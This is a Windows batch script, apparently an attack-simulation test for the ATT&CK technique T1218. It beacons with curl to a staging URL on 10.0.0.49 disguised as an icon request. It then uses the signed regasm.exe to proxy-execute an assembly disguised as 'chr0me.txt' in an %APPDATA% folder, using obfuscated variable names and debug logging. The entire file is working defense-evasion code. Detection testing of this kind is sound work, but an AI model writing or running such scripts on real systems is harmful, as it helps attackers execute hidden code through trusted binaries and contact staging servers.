@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9511\34d9ee87
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9511-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=chr0me.txt
SET ewjmdkff=9511
SET klmw=%APPDATA%\!pudaazx!\macula-simulations.log
SET ylwq=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start=>> "!klmw!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=!ERRORLEVEL!>> "!klmw!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>> "!klmw!" 2>nul
cd /d "!pjkcpgw!" 2>nul
SET nxvd=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_complete=!nxvd!>> "!klmw!" 2>nul

IF !nxvd! EQU 0 (
  SET res=1
  SET err=
  echo [!DATE! !TIME!][DEBUG][!hlbnp!]: regasm_start=!syjfr!>> "!klmw!" 2>nul
  "!ylwq!" /U "!syjfr!" 2>nul
  IF !ERRORLEVEL! NEQ 0 (
    SET res=0
    SET err=assembly_load_failed
  )
  echo [!DATE! !TIME!][DEBUG][!hlbnp!]: regasm_complete=!ERRORLEVEL!>> "!klmw!" 2>nul
) ELSE (
  SET res=0
  SET err=directory_change_failed
)

echo [!DATE! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!res!:!err!>> "!klmw!" 2>nul
ENDLOCAL